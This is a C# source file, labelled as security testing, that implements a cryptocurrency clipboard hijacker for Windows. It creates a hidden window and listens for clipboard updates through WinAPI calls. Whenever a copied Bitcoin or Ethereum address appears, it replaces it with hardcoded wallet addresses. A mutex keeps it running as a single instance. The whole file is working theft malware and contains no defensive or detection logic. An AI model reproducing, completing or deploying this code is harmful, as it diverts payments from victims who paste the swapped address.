using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Threading;

namespace SecurityTesting
{
    public class AdvancedClipper : NativeWindow
    {
        // --- WinAPI P/Invoke Definitions (Bypasses .NET Managed Hooks) ---
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseClipboard();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool EmptyClipboard();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GlobalLock(IntPtr hMem);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GlobalUnlock(IntPtr hMem);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);

        private const uint CF_UNICODETEXT = 13;
        private const uint WM_CLIPBOARDUPDATE = 0x031D;
        private const uint GMEM_MOVEABLE = 0x0002;

        // --- Target Patterns ---
        private static string MyBTC = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfJH7EVX";
        private static string MyETH = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";

        private static readonly Regex btcRegex = new Regex(@"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$");
        private static readonly Regex ethRegex = new Regex(@"^0x[a-fA-F0-9]{40}$");

        public AdvancedClipper()
        {
            // Hidden Message-Only Window
            this.CreateHandle(new CreateParams());
            AddClipboardFormatListener(this.Handle);
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_CLIPBOARDUPDATE) { OnClipboardChanged(); }
            base.WndProc(ref m);
        }

        private void OnClipboardChanged()
        {
            string text = GetText();
            if (string.IsNullOrEmpty(text)) return;

            string target = null;
            if (btcRegex.IsMatch(text.Trim()) && text.Trim() != MyBTC) target = MyBTC;
            else if (ethRegex.IsMatch(text.Trim()) && text.Trim() != MyETH) target = MyETH;

            if (target != null) SetText(target);
        }

        private string GetText()
        {
            if (!OpenClipboard(this.Handle)) return null;
            IntPtr handle = GetClipboardData(CF_UNICODETEXT);
            if (handle == IntPtr.Zero) { CloseClipboard(); return null; }
            IntPtr pointer = GlobalLock(handle);
            string result = Marshal.PtrToStringUni(pointer);
            GlobalUnlock(handle);
            CloseClipboard();
            return result;
        }

        private void SetText(string text)
        {
            if (!OpenClipboard(this.Handle)) return;
            EmptyClipboard();
            IntPtr hGlobal = GlobalAlloc(GMEM_MOVEABLE, (UIntPtr)((text.Length + 1) * sizeof(char)));
            IntPtr pointer = GlobalLock(hGlobal);
            Marshal.Copy(text.ToCharArray(), 0, pointer, text.Length);
            Marshal.WriteInt16(pointer, text.Length * sizeof(char), 0);
            GlobalUnlock(hGlobal);
            SetClipboardData(CF_UNICODETEXT, hGlobal);
            CloseClipboard();
        }

        [STAThread]
        public static void Main()
        {
            using (new Mutex(true, "Global\\ClipperAudit", out bool isNew))
            {
                if (!isNew) return;
                new AdvancedClipper();
                Application.Run();
            }
        }
    }
}
